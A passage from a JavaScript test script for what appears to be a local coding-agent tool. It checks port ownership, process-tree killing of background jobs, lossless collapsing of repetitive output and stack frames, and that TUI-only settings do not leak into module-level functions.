    ok("someone else's local service is not", !P.portOwnedBy(5432, [100], { ps, portLookup: () => ({ pids: new Set([200]) }) }));
    ok("no jobs → never ours", !P.portOwnedBy(3000, [], { ps, portLookup: () => ({ pids: new Set([102]) }) }));
    if (process.platform !== "win32") {
      const cp = require("child_process");
      const J2 = createBgJobs();
      const child = cp.spawn("sh", ["-c", "sleep 287 & sleep 287 & wait"], { detached: true, stdio: "ignore" });
      const jid = J2.start("x", child, 1);
      await new Promise((r) => setTimeout(r, 150));
      J2.stop("1");
      await new Promise((r) => setTimeout(r, 150));
      const left = cp.spawnSync("sh", ["-c", "ps -Ao args | grep -c '^sleep 287$' || true"], { encoding: "utf8" }).stdout.trim();
      eq("stop kills the job's whole process tree", left, "0");
      eq("stopped job status", J2.get(jid).status, "killed");
    }
  }

  // ── lossless progress-run collapse + node-internal frames (model copy only) ──
  {
    const C = require("../lib/nexus/costsave");
    let t = ""; for (let i = 0; i < 30; i++) t += "running case " + i + "\n";
    const r = C.collapseSequences(t + "done");
    ok("counting run → first, exact note, last", r.text.split("\n").length === 4 && /28 more lines .* counting up by 1/.test(r.text) && /running case 29\ndone$/.test(r.text));
    eq("step and direction kept", /counting down by 5/.test(C.collapseSequences(Array.from({ length: 20 }, (_, k) => "items left: " + (200 - 5 * k)).join("\n")).text), true);
    eq("two numbers changing → untouched", C.collapseSequences(["a 1 b 1", "a 2 b 2", "a 3 b 3", "a 4 b 4", "a 5 b 5", "a 6 b 6"].join("\n")).saved, 0);
    eq("uneven steps → untouched", C.collapseSequences(["x 1", "x 2", "x 4", "x 5", "x 6", "x 9"].join("\n")).saved, 0);
    eq("leading zeros → untouched", C.collapseSequences(["f 01", "f 02", "f 03", "f 04", "f 05", "f 06"].join("\n")).saved, 0);
    eq("short runs → untouched", C.collapseSequences("x 1\nx 2\nx 3\nx 4").saved, 0);
    const st = "Error: boom\n    at run (/p/app.js:3:9)\n    at Module._compile (node:internal/modules/cjs/loader:1521:14)\n    at Module.load (node:internal/modules/cjs/loader:1266:32)\n    at node:internal/main/run_main_module:28:49 {\n  code: 'X'\n}";
    const d = C.dropInternalFrames(st).text;
    ok("project frame kept, internal ones counted, brace kept", /at run \(\/p\/app\.js:3:9\)/.test(d) && /\[3 node-internal stack frames\] \{\n  code: 'X'\n\}$/.test(d));
    eq("a lone internal frame stays as is", C.dropInternalFrames("E\n    at x (node:internal/a:1:1)\n    at y (/p/b.js:1:1)").saved, 0);
    const res = { output: t, content: t };
    C.collapseToolOutput(res);
    ok("file contents are never collapsed", res.content === t && res.output !== t);
  }

  // ── TUI-only settings must not leak into module-level helpers (ollamaExec used `lean`:
  //    every sub-agent / task-queue run_command threw "lean is not defined") ──
  {
    const L = require("fs").readFileSync(require("path").join(__dirname, "..", "darknode.js"), "utf8").split("\n");
    const leaks = [];
    for (let i = 0; i < L.length; i++) {
      const m = /^(?:async )?function (\w+)\(([^)]*)\)/.exec(L[i]); if (!m || m[1] === "nexusTui") continue;
      let j = i + 1; while (j < L.length && L[j] !== "}") j++;
      const body = L.slice(i, j + 1).map((l) => l.replace(/\/\/.*$/, "")).join("\n");
      for (const v of ["lean", "trimOutput", "stepCap", "autoCompact", "cheapSide"]) {
        const used = new RegExp("(?<![\\w$.\"'])" + v + "\\b(?!\\s*:)").test(body), declared = new RegExp("(?:const|let|var)\\s+[^;=]*\\b" + v + "\\b").test(body) || new RegExp("\\b" + v + "\\b").test(m[2]);
        if (used && !declared) leaks.push(m[1] + ":" + v);
      }
      i = j;
    }
    eq("no module-level function reads a TUI-only setting", leaks, []);
  }

  console.log("\n" + (fail ? "\x1b[31m" : "\x1b[32m") + pass + " passed, " + fail + " failed\x1b[0m");
  process.exit(fail ? 1 : 0);
})();
